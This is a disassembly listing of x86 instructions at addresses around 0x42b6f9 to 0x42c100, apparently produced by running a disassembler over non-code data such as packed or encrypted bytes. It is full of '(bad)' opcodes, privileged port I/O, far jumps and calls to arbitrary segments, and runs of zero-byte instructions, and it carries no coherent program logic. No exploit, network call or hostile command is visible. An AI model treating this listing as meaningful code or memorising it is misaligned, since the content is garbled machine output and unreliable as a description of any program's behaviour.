  42b6f9:	ss inc ebp
  42b6fb:	call   0x7c0c4a37
  42b700:	mov    esi,ss
  42b702:	push   esp
  42b703:	fisttp DWORD PTR [edi-0x7c]
  42b706:	sub    ecx,0xffffffba
  42b709:	or     bh,BYTE PTR [edi-0x49]
  42b70c:	pop    es
  42b70d:	push   ds
  42b70e:	sub    bl,bl
  42b710:	popf   
  42b711:	pop    ds
  42b712:	jmp    0x42b712
  42b714:	or     DWORD PTR [ebp+0x37],ecx
  42b717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b718:	jmp    0x42b6b4
  42b71a:	sub    BYTE PTR [edx-0x36],ch
  42b71d:	jecxz  0x42b791
  42b71f:	and    al,BYTE PTR [ecx]
  42b721:	mov    esp,0xa36f592a
  42b726:	mov    dh,0x47
  42b728:	add    ecx,edx
  42b72a:	cdq    
  42b72b:	dec    ebx
  42b72c:	in     eax,dx
  42b72d:	fsubr  QWORD PTR [ebp+0x5f00cec2]
  42b733:	pusha  
  42b734:	add    ch,BYTE PTR [ebx]
  42b736:	cmp    eax,0x3cdf9a0c
  42b73b:	mov    edx,0xef49b209
  42b740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b741:	bound  ecx,QWORD PTR [edx+0x12]
  42b744:	dec    ebp
  42b745:	push   ss
  42b746:	fbld   TBYTE PTR [esi+0x1f861060]
  42b74c:	adc    DWORD PTR [ecx+0x24b46fac],edi
  42b752:	in     eax,0x91
  42b754:	(bad)  
  42b755:	dec    eax
  42b756:	cmp    cl,BYTE PTR [ecx]
  42b758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b759:	stc    
  42b75a:	retf   
  42b75b:	loopne 0x42b74d
  42b75d:	inc    edi
  42b75e:	xchg   ebx,eax
  42b75f:	outs   dx,BYTE PTR ds:[esi]
  42b760:	xchg   DWORD PTR [edi],ebx
  42b762:	pop    ebx
  42b763:	cmp    dl,al
  42b765:	out    0x17,eax
  42b767:	sub    DWORD PTR [ebp-0x6ccb9cc0],esi
  42b76d:	fild   DWORD PTR [eax]
	...
  42b7d3:	add    BYTE PTR [eax],al
  42b7d5:	add    BYTE PTR [esi+0x42],cl
  42b7d8:	dec    ecx
  42b7d9:	daa    
  42b7da:	dec    ebp
  42b7db:	das    
  42b7dc:	outs   dx,BYTE PTR ds:[esi]
  42b7dd:	imul   edx,edx,0x63
  42b7e0:	push   ecx
  42b7e1:	xchg   edx,eax
  42b7e2:	pop    eax
  42b7e3:	inc    esi
  42b7e4:	dec    esp
  42b7e5:	imul   esp,DWORD PTR [edi-0x2e],0x1
  42b7e9:	add    BYTE PTR [eax],al
  42b7eb:	add    DWORD PTR [eax],eax
  42b7ed:	add    BYTE PTR [esi+eiz*2+0x1e],al
  42b7f1:	rcr    dh,0xa7
  42b7f4:	adc    eax,eax
  42b7f6:	inc    ecx
  42b7f7:	bound  ebp,QWORD PTR [ebx+edi*8]
  42b7fa:	jb     0x42b7ed
  42b7fc:	jmp    0x433cdc53
  42b801:	xchg   ebp,eax
  42b802:	lods   eax,DWORD PTR ds:[esi]
  42b803:	cli    
  42b804:	inc    ecx
  42b805:	outs   dx,DWORD PTR ds:[esi]
  42b806:	or     DWORD PTR [edi+0x7e],0x8aab501
  42b80d:	jge    0x42b802
  42b80f:	mov    DWORD PTR [eax-0x31a2957e],ebp
  42b815:	imul   eax,DWORD PTR cs:[edx-0x64],0x75
  42b81a:	jnp    0x42b7a2
  42b81c:	inc    ecx
  42b81d:	add    BYTE PTR [esi],al
  42b81f:	mov    ebx,0xc7fe3c01
  42b824:	sub    al,0x5d
  42b826:	fwait
  42b827:	xchg   ebx,eax
  42b828:	retf   0x7ed1
  42b82b:	push   edx
  42b82c:	mov    ebp,0x6c541e4b
  42b831:	or     DWORD PTR [edx+eiz*1-0x7b09c888],ebp
  42b838:	push   ecx
  42b839:	jae    0x42b7ec
  42b83b:	xor    cl,dh
  42b83d:	sar    BYTE PTR ds:0x96a22d96,cl
  42b843:	sahf   
  42b844:	mov    al,ds:0x93054de8
  42b849:	add    eax,0x6e93711f
  42b84e:	cmp    eax,0xa2bb47c4
  42b853:	out    0x98,al
  42b855:	ds ins BYTE PTR es:[edi],dx
  42b857:	xor    DWORD PTR [edx],ebp
  42b859:	mov    eax,ds:0x54cf0eb9
  42b85e:	inc    ebp
  42b85f:	test   al,0xb1
  42b861:	mov    ds:0x9344daf8,eax
  42b866:	pop    ecx
  42b867:	fdiv   QWORD PTR [edi]
  42b869:	xchg   ebp,eax
  42b86a:	sbb    ecx,eax
  42b86c:	mov    ds:0xd04898be,al
  42b871:	inc    ebx
  42b872:	or     al,0xfb
  42b874:	mov    ebx,0x7299ea86
  42b879:	(bad)  
  42b87a:	sbb    al,0x9
  42b87c:	pop    edi
  42b87d:	push   cs
  42b87e:	and    BYTE PTR [bp-0x3fd2],dl
  42b883:	mov    eax,ds:0xf9f7c2ad
  42b888:	call   0x643c:0x4ec9599e
  42b88f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b890:	lea    ebp,[esi-0x7051ecc]
  42b896:	pop    ss
  42b897:	leave  
  42b898:	mov    ?,esp
  42b89a:	dec    ebx
  42b89b:	xchg   esp,eax
  42b89c:	push   es
  42b89d:	outs   dx,BYTE PTR ds:[esi]
  42b89e:	xor    DWORD PTR [edx+ebx*8+0x61ef243],edi
  42b8a5:	mov    dl,0x2b
  42b8a7:	dec    eax
  42b8a8:	adc    BYTE PTR [edi],dh
  42b8aa:	mov    ecx,0x8d1dba5d
  42b8af:	gs dec eax
  42b8b1:	inc    esi
  42b8b2:	aas    
  42b8b3:	test   eax,0x8188895f
  42b8b8:	out    0xcc,eax
  42b8ba:	dec    ebp
  42b8bb:	dec    esp
  42b8bc:	cmp    al,0x19
  42b8be:	in     eax,dx
  42b8bf:	loopne 0x42b854
  42b8c1:	xor    eax,0x622ab3e3
  42b8c6:	repnz int3 
  42b8c8:	inc    ebp
  42b8c9:	sbb    edx,DWORD PTR [edx-0x62894796]
  42b8cf:	addr16 pop eax
  42b8d1:	mov    ds:0xc5779bd1,al
  42b8d6:	lahf   
  42b8d7:	test   eax,0xbf851062
  42b8dc:	push   esi
  42b8dd:	int3   
  42b8de:	pushf  
  42b8df:	aad    0x76
  42b8e1:	fld    st(1)
  42b8e3:	popa   
  42b8e4:	sbb    DWORD PTR [ebx-0x24],ebp
  42b8e7:	test   edx,ecx
  42b8e9:	add    ebp,DWORD PTR [ebx+0x8e8544]
	...
  42b953:	add    BYTE PTR [eax],al
  42b955:	add    al,ch
  42b957:	popf   
  42b958:	mov    esi,0xf9e7ffe7
  42b95d:	lahf   
  42b95e:	ret    0x608c
  42b961:	or     edi,DWORD PTR [ecx]
  42b963:	mov    ds:0xd3679e05,al
  42b968:	add    DWORD PTR [eax],eax
  42b96a:	add    BYTE PTR [ecx],al
  42b96c:	add    BYTE PTR [eax],al
  42b96e:	mov    cl,BYTE PTR [ebp+0x720a8c3d]
  42b974:	dec    eax
  42b975:	cs mov al,0xe
  42b978:	out    dx,eax
  42b979:	dec    ecx
  42b97a:	repz sar BYTE PTR [esi+0x57],1
  42b97e:	inc    edx
  42b97f:	sbb    BYTE PTR [edi+0x5f],0x99
  42b983:	ds dec ebp
  42b985:	scas   al,BYTE PTR es:[edi]
  42b986:	gs out dx,eax
  42b988:	push   ecx
  42b989:	js     0x42b990
  42b98b:	mov    edx,0x16b072fe
  42b990:	mov    eax,ds:0x2ced0e66
  42b995:	lds    esi,FWORD PTR [edi-0x9]
  42b998:	jmp    ebx
  42b99a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b99b:	mov    edi,0x211b0ab8
  42b9a0:	popa   
  42b9a1:	or     eax,0x87320e3f
  42b9a6:	fwait
  42b9a7:	test   al,0x2e
  42b9a9:	dec    ecx
  42b9aa:	and    cl,0x58
  42b9ad:	mov    esp,0x64988c9b
  42b9b2:	xlat   BYTE PTR ds:[ebx]
  42b9b3:	and    al,0x9c
  42b9b5:	xchg   ebp,eax
  42b9b6:	sub    ch,BYTE PTR [edi-0x5]
  42b9b9:	inc    ecx
  42b9ba:	xor    ch,bh
  42b9bc:	add    DWORD PTR [eax-0x72],ebx
  42b9bf:	(bad)  
  42b9c0:	out    0x51,eax
  42b9c2:	das    
  42b9c3:	xchg   edx,eax
  42b9c4:	outs   dx,BYTE PTR ds:[esi]
  42b9c5:	xchg   edx,eax
  42b9c6:	popa   
  42b9c7:	xchg   eax,eax
  42b9c9:	and    ebp,DWORD PTR [ebp+0x7afe3d11]
  42b9cf:	mov    ds:0x36d33f69,al
  42b9d4:	cwde   
  42b9d5:	mov    eax,0xe8756f86
  42b9da:	and    BYTE PTR [ebp+ebp*1-0x3f],dl
  42b9de:	inc    ebx
  42b9df:	or     eax,0xaba89631
  42b9e4:	xchg   esi,eax
  42b9e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b9e6:	jg     0x42ba1d
  42b9e8:	sub    ebp,edx
  42b9ea:	mov    al,ds:0x6fe72eab
  42b9ef:	ret    0xfb99
  42b9f2:	out    dx,al
  42b9f3:	ins    DWORD PTR es:[edi],dx
  42b9f4:	jb     0x42b986
  42b9f6:	in     al,dx
  42b9f7:	fidivr DWORD PTR ds:0xf01fbd8d
  42b9fd:	loopne 0x42b9a4
  42b9ff:	fdivr  DWORD PTR [esi]
  42ba01:	inc    esi
  42ba02:	dec    ebp
  42ba03:	mov    ecx,ecx
  42ba05:	cmc    
  42ba06:	pop    edi
  42ba07:	push   0x1992a725
  42ba0c:	cmp    DWORD PTR [ebp+0x65530d92],edx
  42ba12:	test   al,0x22
  42ba14:	iret   
  42ba15:	ret    
  42ba16:	push   edx
  42ba17:	paddd  mm4,mm0
  42ba1a:	lds    eax,FWORD PTR [edi+0x2809653e]
  42ba20:	(bad)  
  42ba21:	push   cs
  42ba22:	ins    DWORD PTR es:[edi],dx
  42ba23:	rol    BYTE PTR [ebp+0x6],1
  42ba26:	jbe    0x42ba62
  42ba28:	daa    
  42ba29:	and    BYTE PTR [ecx-0x20b0896e],0x7
  42ba30:	lods   al,BYTE PTR ds:[esi]
  42ba31:	cmp    eax,0x538cb32b
  42ba36:	fs cmp edx,edi
  42ba39:	mov    ds:0x16063cb1,eax
  42ba3e:	imul   BYTE PTR [ecx+edi*8]
  42ba41:	arpl   WORD PTR [esi-0x1b041fd7],dx
  42ba47:	or     BYTE PTR [esi+ebp*1+0x2aed7538],cl
  42ba4e:	sbb    eax,0x5cccc17f
  42ba53:	fstp   TBYTE PTR ds:0xd143708f
  42ba59:	and    al,0x9c
  42ba5b:	pop    esi
  42ba5c:	or     al,0x11
  42ba5e:	rol    DWORD PTR [ebp-0x3e],0x12
  42ba62:	test   al,0x15
  42ba64:	jg     0x42b9ec
  42ba66:	jmp    0xaa6:0x6a2a19ba
  42ba6d:	aam    0x0
	...
  42bad3:	add    BYTE PTR [eax],al
  42bad5:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42badb:	neg    ebx
  42badd:	outs   dx,DWORD PTR ds:[esi]
  42bade:	push   0x5b
  42bae0:	xchg   ecx,eax
  42bae1:	or     eax,edx
  42bae3:	mov    esp,0xd4671931
  42bae8:	add    DWORD PTR [eax],eax
  42baea:	add    BYTE PTR [ecx],al
  42baec:	add    BYTE PTR [eax],al
  42baee:	inc    BYTE PTR [ecx-0x7]
  42baf1:	xor    ebx,DWORD PTR [edi]
  42baf3:	aaa    
  42baf4:	repz or esi,esi
  42baf7:	cmc    
  42baf8:	out    dx,al
  42baf9:	out    0xef,al
  42bafb:	dec    ecx
  42bafc:	call   0xc95d9344
  42bb01:	out    dx,eax
  42bb02:	cli    
  42bb03:	sub    bl,ah
  42bb05:	out    0x16,al
  42bb07:	data16 and BYTE PTR [eax],bl
  42bb0a:	iret   
  42bb0b:	mov    edi,0xf075b8ba
  42bb11:	sub    edx,DWORD PTR [ecx-0x70]
  42bb14:	pop    edi
  42bb15:	loop   0x42baea
  42bb17:	inc    esp
  42bb18:	mov    ds:0x1ee71efa,al
  42bb1d:	mov    al,ds:0x80d1e41d
  42bb22:	mov    ch,dl
  42bb24:	les    ecx,FWORD PTR [esi+0x33]
  42bb27:	xor    DWORD PTR [ebp+0x4cde1bb7],esp
  42bb2d:	imul   edi,DWORD PTR [ebp+ebp*8-0x62086043],0xbc7d356
  42bb38:	js     0x42bb12
  42bb3a:	or     edx,DWORD PTR ds:0x8dee7284
  42bb40:	or     BYTE PTR [esi+eax*8],ch
  42bb43:	rcl    DWORD PTR [eax-0xb377c1f],1
  42bb49:	adc    al,0xfb
  42bb4b:	pop    ecx
  42bb4c:	add    eax,0x69cb0d6a
  42bb51:	test   DWORD PTR [edx-0x72],0xe948d599
  42bb58:	loopne 0x42bb8f
  42bb5a:	je     0x42baf2
  42bb5c:	jl     0x42bb7d
  42bb5e:	mov    bh,0x8c
  42bb60:	in     eax,dx
  42bb61:	lea    ebx,[edx-0x29]
  42bb64:	xor    ebx,esp
  42bb66:	dec    eax
  42bb67:	inc    ebp
  42bb68:	lahf   
  42bb69:	pop    esi
  42bb6a:	or     ah,BYTE PTR [edx-0x80]
  42bb6d:	fisubr DWORD PTR [edi+0x652d0494]
  42bb73:	out    dx,al
  42bb74:	pop    ecx
  42bb75:	cs icebp 
  42bb77:	mov    edx,0x14856452
  42bb7c:	outs   dx,BYTE PTR ds:[esi]
  42bb7d:	retf   0xad5e
  42bb80:	xor    bl,0xd3
  42bb83:	jb     0x42bb15
  42bb85:	mov    eax,0xac283fc5
  42bb8a:	mov    esp,0x3830ca5
  42bb8f:	inc    eax
  42bb90:	mov    BYTE PTR [ebx+0x5cc0337a],cl
  42bb96:	lods   eax,DWORD PTR ds:[esi]
  42bb97:	enter  0x17c5,0xae
  42bb9b:	mov    bh,0x88
  42bb9d:	jnp    0x42bb2a
  42bb9f:	js     0x42bbca
  42bba1:	xor    eax,0x1b473a3
  42bba6:	pop    edi
  42bba7:	js     0x42bb52
  42bba9:	dec    eax
  42bbaa:	cmp    eax,0x4544d341
  42bbaf:	int    0x34
  42bbb1:	rol    DWORD PTR [ecx+0x23],cl
  42bbb4:	jecxz  0x42bb69
  42bbb6:	(bad)  
  42bbb7:	shl    ecx,1
  42bbb9:	lods   eax,DWORD PTR ds:[esi]
  42bbba:	invd   
  42bbbc:	scas   eax,DWORD PTR es:[edi]
  42bbbd:	nop
  42bbbe:	lds    esp,FWORD PTR [ebx+0x0]
  42bbc1:	call   0xfabd396a
  42bbc6:	arpl   WORD PTR [edi-0x30f72165],ax
  42bbcc:	scas   eax,DWORD PTR es:[edi]
  42bbcd:	out    0xea,eax
  42bbcf:	out    0x5f,eax
  42bbd1:	and    ah,BYTE PTR [edi+0x54e2c88b]
  42bbd7:	cs sub eax,0xd8eacf98
  42bbdd:	pusha  
  42bbde:	ja     0x42bb8e
  42bbe0:	stos   BYTE PTR es:[edi],al
  42bbe1:	push   ebx
  42bbe2:	jae    0x42bc4a
  42bbe4:	lock (bad) 
  42bbe6:	pop    ebp
  42bbe7:	sbb    al,0x1b
  42bbe9:	cmp    DWORD PTR [esp+esi*8+0x4bdc],edx
	...
  42bc54:	add    BYTE PTR [eax],al
  42bc56:	xor    al,0x28
  42bc58:	add    DWORD PTR [esi],eax
  42bc5a:	sbb    eax,0x233a372f
  42bc5f:	sub    DWORD PTR [ebx],eax
  42bc61:	dec    ecx
  42bc62:	xchg   edx,eax
  42bc63:	sub    DWORD PTR [edx+0x32],edx
  42bc66:	addr16 aad 0x1
  42bc69:	add    BYTE PTR [eax],al
  42bc6b:	add    DWORD PTR [eax],eax
  42bc6d:	add    bh,dl
  42bc6f:	and    edi,DWORD PTR [ebp+ecx*2+0x22]
  42bc73:	mov    al,al
  42bc75:	retf   0xbcbb
  42bc78:	(bad)  
  42bc79:	jns    0x42bce7
  42bc7b:	jnp    0x42bc94
  42bc7d:	(bad)  
  42bc7e:	xor    BYTE PTR [eax],dl
  42bc80:	dec    esi
  42bc81:	mov    al,ds:0x425f362a
  42bc86:	jb     0x42bcc6
  42bc88:	pop    es
  42bc89:	mov    eax,ds:0xd243e4d2
  42bc8e:	stc    
  42bc8f:	dec    ebp
  42bc90:	push   esp
  42bc91:	cmp    al,0xd9
  42bc93:	xchg   BYTE PTR [ebx],dl
  42bc95:	mov    eax,0x11795340
  42bc9a:	clc    
  42bc9b:	mov    es,ebp
  42bc9d:	inc    edx
  42bc9e:	(bad)  
  42bc9f:	pop    ebx
  42bca0:	test   al,0x5c
  42bca2:	mov    ah,0x34
  42bca4:	xlat   BYTE PTR ds:[ebx]
  42bca5:	xor    BYTE PTR [edi+0x10b31676],dh
  42bcab:	mov    BYTE PTR [eax],dl
  42bcad:	out    dx,al
  42bcae:	push   0xdf522497
  42bcb3:	sub    al,0xc6
  42bcb5:	nop
  42bcb6:	push   eax
  42bcb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bcb9:	push   cs
  42bcba:	mov    ebx,DWORD PTR fs:[edx]
  42bcbd:	xchg   esp,eax
  42bcbe:	daa    
  42bcbf:	cli    
  42bcc0:	lock and esi,ecx
  42bcc3:	sbb    al,0x7f
  42bcc5:	jmp    0x42bc8f
  42bcc7:	inc    ebx
  42bcc8:	icebp  
  42bcc9:	push   eax
  42bcca:	cli    
  42bccb:	inc    edi
  42bccc:	push   0x1
  42bcce:	pop    ss
  42bccf:	mov    WORD PTR cs:[ecx+0x48],gs
  42bcd3:	xor    cl,dl
  42bcd5:	mov    ch,0xc2
  42bcd7:	in     al,dx
  42bcd8:	repnz cmp DWORD PTR [ecx],0xffffffd5
  42bcdc:	in     eax,0x5f
  42bcde:	mov    eax,ds:0x1c782f68
  42bce3:	push   esp
  42bce4:	add    al,0x7c
  42bce6:	repz shr DWORD PTR [edi-0x25f55f7],0xba
  42bcee:	jb     0x42bd40
  42bcf0:	ror    BYTE PTR [edi],cl
  42bcf2:	cld    
  42bcf3:	add    al,0xab
  42bcf5:	loope  0x42bce9
  42bcf7:	and    al,0x19
  42bcf9:	inc    sp
  42bcfb:	fmul   QWORD PTR [ecx-0x6efb9c2e]
  42bd01:	push   esi
  42bd02:	jmp    0xdeb3:0x169ad3ad
  42bd09:	in     eax,dx
  42bd0a:	pop    edi
  42bd0b:	js     0x42bd4b
  42bd0d:	inc    edi
  42bd0e:	rol    DWORD PTR [eax+esi*1+0x1a15809e],0xe1
  42bd16:	add    esi,esp
  42bd18:	push   ss
  42bd19:	out    dx,eax
  42bd1a:	inc    edx
  42bd1b:	bound  ecx,QWORD PTR [edx-0x69467df3]
  42bd21:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd23:	and    BYTE PTR [ecx-0x1dad84a1],0x2d
  42bd2a:	ins    BYTE PTR es:[edi],dx
  42bd2b:	fucompp 
  42bd2d:	push   es
  42bd2e:	jge    0x42bd18
  42bd30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd31:	mov    bl,0xcb
  42bd33:	push   esp
  42bd34:	sub    dh,BYTE PTR [ebx]
  42bd36:	dec    esi
  42bd37:	add    ah,bh
  42bd39:	out    dx,al
  42bd3a:	retf   0x5645
  42bd3d:	adc    ecx,esi
  42bd3f:	mov    eax,ds:0x2bcd446d
  42bd45:	call   0xba90:0x329c296
  42bd4c:	mov    eax,0x3df4cd2a
  42bd51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bd52:	sbb    ch,0x55
  42bd55:	xchg   esi,eax
  42bd56:	dec    ebx
  42bd57:	mov    al,ds:0xb2b701b5
  42bd5c:	test   BYTE PTR [ebx+ebx*8-0x3784a4c8],bh
  42bd63:	xlat   BYTE PTR ds:[ebx]
  42bd64:	dec    ecx
  42bd65:	add    BYTE PTR [ebx-0x603696bb],bh
  42bd6b:	mov    ebp,0x2144
	...
  42bdd4:	add    BYTE PTR [eax],al
  42bdd6:	mov    al,0xb6
  42bdd8:	pushf  
  42bdd9:	adc    al,0x9e
  42bddb:	ds mov eax,0xffec3b6
  42bde1:	jae    0x42bde5
  42bde3:	push   edx
  42bde4:	fsub   DWORD PTR [edx]
  42bde6:	addr16 (bad) 
  42bde8:	add    DWORD PTR [eax],eax
  42bdea:	add    BYTE PTR [ecx],al
  42bdec:	add    BYTE PTR [eax],al
  42bdee:	fwait
  42bdef:	dec    edx
  42bdf0:	inc    esp
  42bdf1:	mov    bh,0x30
  42bdf3:	test   BYTE PTR [ebp+0x3c055c39],bl
  42bdf9:	sbb    eax,ebx
  42bdfb:	ins    BYTE PTR es:[edi],dx
  42bdfc:	xchg   ecx,eax
  42bdfd:	cwde   
  42bdfe:	xchg   esp,eax
  42bdff:	call   0xd0ef20cc
  42be04:	and    BYTE PTR [ecx],cl
  42be06:	fisttp DWORD PTR [edx-0x6a]
  42be09:	(bad)  
  42be0a:	out    0x68,eax
  42be0c:	pop    edi
  42be0d:	pop    ds
  42be0e:	xor    ebp,DWORD PTR [edi+0xf071768]
  42be14:	std    
  42be15:	jecxz  0x42bdbc
  42be17:	bound  esp,QWORD PTR [edi+0xf7f9ba8]
  42be1d:	test   DWORD PTR [esi],eax
  42be1f:	pop    ebp
  42be20:	stos   BYTE PTR es:[edi],al
  42be21:	push   eax
  42be22:	loope  0x42bddf
  42be24:	xor    ebp,DWORD PTR [esi]
  42be26:	sub    DWORD PTR [ecx-0x1f],esp
  42be29:	add    ebx,DWORD PTR [ebp-0x7e98fdc5]
  42be2f:	(bad)  
  42be30:	jmp    0xf11281b7
  42be35:	mov    bl,0xc6
  42be37:	lods   eax,DWORD PTR ds:[esi]
  42be38:	or     DWORD PTR [edi],edi
  42be3a:	call   0x30516ff3
  42be3f:	sub    esp,edi
  42be41:	ja     0x42bde1
  42be43:	mov    DWORD PTR [eax],ecx
  42be45:	xor    eax,0xc0018243
  42be4a:	test   DWORD PTR [esi+0x66287400],edx
  42be50:	ins    BYTE PTR es:[edi],dx
  42be51:	test   al,0x41
  42be53:	push   esp
  42be54:	push   esp
  42be55:	xor    ah,BYTE PTR [edi-0x538833dc]
  42be5b:	pop    esi
  42be5c:	push   ebp
  42be5d:	pop    ecx
  42be5e:	and    cl,bh
  42be60:	mov    al,ds:0xaf4e7333
  42be65:	sub    DWORD PTR [eax-0x5c],edi
  42be68:	xor    ah,BYTE PTR [ebx+0x40]
  42be6b:	test   eax,0xa7e1169d
  42be70:	xchg   DWORD PTR [edx-0x55],eax
  42be73:	pop    esi
  42be74:	adc    BYTE PTR [ebp+ebp*4-0x42],bh
  42be78:	daa    
  42be79:	out    0xda,eax
  42be7b:	push   ecx
  42be7c:	enter  0x4be9,0x38
  42be80:	jnp    0x42beea
  42be82:	push   ss
  42be83:	nop
  42be84:	jno    0x42be08
  42be86:	jle    0x42be5e
  42be88:	pop    ebp
  42be89:	ficom  DWORD PTR [eax+0x4b80d266]
  42be8f:	fnsave [edi]
  42be91:	jg     0x42bec8
  42be93:	jecxz  0x42beb2
  42be95:	push   0x9968bf91
  42be9a:	xor    bl,ah
  42be9c:	imul   edi,DWORD PTR [esi-0x78],0xdb69bbae
  42bea3:	in     eax,dx
  42bea4:	xlat   BYTE PTR ds:[ebx]
  42bea5:	icebp  
  42bea6:	out    0xc8,eax
  42bea8:	(bad)  
  42bea9:	rcl    DWORD PTR ds:0x11b8a3fa,1
  42beaf:	xor    ebp,DWORD PTR [ecx+0x203c0a58]
  42beb5:	jge    0x42bf33
  42beb7:	imul   ecx,DWORD PTR [eax],0x177e0ba7
  42bebd:	bound  edx,QWORD PTR [ebx-0x75694fce]
  42bec3:	xchg   edx,eax
  42bec4:	mov    DWORD PTR [eax+0x7b],edx
  42bec7:	xchg   ecx,eax
  42bec8:	sub    cl,BYTE PTR [ecx+0x49da4521]
  42bece:	mov    ebx,0xfc9a83ac
  42bed3:	push   ecx
  42bed4:	popa   
  42bed5:	stos   DWORD PTR es:[edi],eax
  42bed6:	(bad)  
  42bed7:	aam    0xf5
  42bed9:	lds    edi,FWORD PTR [edi+0x54]
  42bedc:	(bad)  
  42bedd:	xchg   edi,eax
  42bede:	or     edx,DWORD PTR [ecx+0x449bc0df]
  42bee4:	retf   0x722d
  42bee7:	mov    edi,fs
  42bee9:	ret    0x1ae6
  42beec:	imul   edx,edi,0x0
	...
  42bf56:	xchg   edi,eax
  42bf57:	and    BYTE PTR [edi-0x26],al
  42bf5a:	idiv   edi
  42bf5c:	lahf   
  42bf5d:	ins    DWORD PTR es:[edi],dx
  42bf5e:	mov    ds:0xbf7bd7c8,eax
  42bf63:	dec    edx
  42bf64:	jne    0x42befb
  42bf66:	xlat   BYTE PTR ds:[bx]
  42bf68:	add    DWORD PTR [eax],eax
  42bf6a:	add    BYTE PTR [ecx],al
  42bf6c:	add    BYTE PTR [eax],al
  42bf6e:	fadd   QWORD PTR [esi]
  42bf70:	call   0xa45bc1ab
  42bf75:	pop    esp
  42bf76:	push   cs
  42bf77:	add    BYTE PTR [eax-0x5f],0x35
  42bf7b:	call   0x1cbe:0x31fed23
  42bf82:	mov    bh,0xf8
  42bf84:	aam    0xa1
  42bf86:	in     eax,dx
  42bf87:	or     al,0xef
  42bf89:	loop   0x42bfa0
  42bf8b:	inc    esi
  42bf8c:	sub    BYTE PTR [edx-0x66],0x38
  42bf90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf91:	cdq    
  42bf92:	mov    BYTE PTR [ebx+0x1],dh
  42bf95:	pusha  
  42bf96:	(bad)  
  42bf97:	loop   0x42bf94
  42bf99:	dec    eax
  42bf9a:	test   DWORD PTR ds:0x662101be,esi
  42bfa0:	outs   dx,DWORD PTR ds:[esi]
  42bfa1:	inc    edx
  42bfa2:	mov    eax,ds:0xa1d57960
  42bfa7:	add    cl,BYTE PTR [ecx]
  42bfa9:	pop    esi
  42bfaa:	cdq    
  42bfab:	mov    ecx,0xdae1b281
  42bfb0:	out    dx,al
  42bfb1:	push   ds
  42bfb2:	inc    esi
  42bfb3:	mov    cl,0x24
  42bfb5:	jg     0x42bfb3
  42bfb7:	sub    eax,0x2d
  42bfba:	sar    BYTE PTR [eax-0x2d0ba053],1
  42bfc0:	inc    esi
  42bfc1:	stos   BYTE PTR es:[edi],al
  42bfc2:	fdiv   QWORD PTR [edi]
  42bfc4:	cmp    al,BYTE PTR [edi-0x289361aa]
  42bfca:	ins    DWORD PTR es:[edi],dx
  42bfcb:	sub    DWORD PTR [ebx+ecx*8+0x16],edx
  42bfcf:	mov    dl,bh
  42bfd1:	adc    edi,edi
  42bfd3:	mov    eax,ds:0x53405654
  42bfd8:	lods   eax,DWORD PTR ds:[esi]
  42bfd9:	aaa    
  42bfda:	stos   DWORD PTR es:[edi],eax
  42bfdb:	cdq    
  42bfdc:	daa    
  42bfdd:	mov    ebp,0x1368fc2d
  42bfe2:	jle    0x42bf8f
  42bfe4:	cmp    cl,BYTE PTR [ebp+eiz*2+0x55]
  42bfe8:	sub    al,0xd6
  42bfea:	das    
  42bfeb:	jg     0x42bfe9
  42bfed:	inc    ecx
  42bfee:	jno    0x42bf96
  42bff0:	aam    0x7
  42bff2:	cvttps2pi mm5,QWORD PTR [ebp+ecx*8+0x22328795]
  42bffa:	pusha  
  42bffb:	call   0x23dc704a
  42c000:	inc    ecx
  42c002:	push   es
  42c003:	test   DWORD PTR [eax],0x47d84435
  42c009:	sbb    al,0xaa
  42c00b:	pushf  
  42c00c:	mov    ch,0xb
  42c00e:	jmp    0x42c042
  42c010:	stos   BYTE PTR es:[edi],al
  42c011:	xchg   edx,eax
  42c012:	xchg   ebp,eax
  42c013:	mov    ecx,0xc28fda5a
  42c018:	dec    ebx
  42c019:	call   0x670e:0x29981be7
  42c020:	gs sub dh,bl
  42c023:	mov    ch,0x9e
  42c025:	xor    DWORD PTR [ecx-0x2b],eax
  42c028:	dec    esp
  42c029:	nop
  42c02a:	jmp    0x42bfe2
  42c02c:	ror    BYTE PTR [edx+esi*8],0x56
  42c030:	daa    
  42c031:	lods   eax,DWORD PTR ds:[esi]
  42c032:	imul   esp,DWORD PTR [ecx],0x14b83b9a
  42c038:	xor    al,0x1e
  42c03a:	mov    al,0x4e
  42c03c:	gs jno 0x42c099
  42c03f:	mov    bl,0x78
  42c041:	repnz sub DWORD PTR [eax+0x77],ebp
  42c045:	xchg   ecx,eax
  42c046:	(bad)  
  42c047:	sbb    ebp,esi
  42c049:	repnz dec ecx
  42c04b:	pop    esp
  42c04c:	ror    BYTE PTR [ebp+ebx*1+0x64],0xc9
  42c051:	mov    bl,ah
  42c053:	or     BYTE PTR [edi+esi*8-0x64],ah
  42c057:	sahf   
  42c058:	sub    eax,0x95388655
  42c05d:	add    DWORD PTR [ebp+0x7f],eax
  42c060:	(bad)  
  42c061:	in     eax,dx
  42c062:	xchg   esi,eax
  42c063:	dec    edi
  42c064:	(bad)  
  42c066:	lods   eax,DWORD PTR ds:[esi]
  42c067:	repnz (bad) 
  42c069:	jae    0x42c071
  42c06b:	xchg   DWORD PTR [edi],edx
  42c06d:	cmc    
	...
  42c0d6:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c0dc:	jg     0x42c078
  42c0de:	leave  
  42c0df:	or     DWORD PTR [edi-0x57],edi
  42c0e2:	mov    esp,0x67667694
  42c0e7:	fadd   DWORD PTR [ecx]
  42c0e9:	add    BYTE PTR [eax],al
  42c0eb:	add    DWORD PTR [eax],eax
  42c0ed:	add    BYTE PTR [ebp+0x4d5fbc26],ch
  42c0f3:	into   
  42c0f4:	loopne 0x42c089
  42c0f6:	push   esi
  42c0f7:	mov    ebp,0xeead0e5
  42c0fc:	ret    
  42c0fd:	xlat   BYTE PTR ds:[ebx]
  42c0fe:	out    dx,eax
  42c0ff:	(bad)  
  42c100:	push   ds
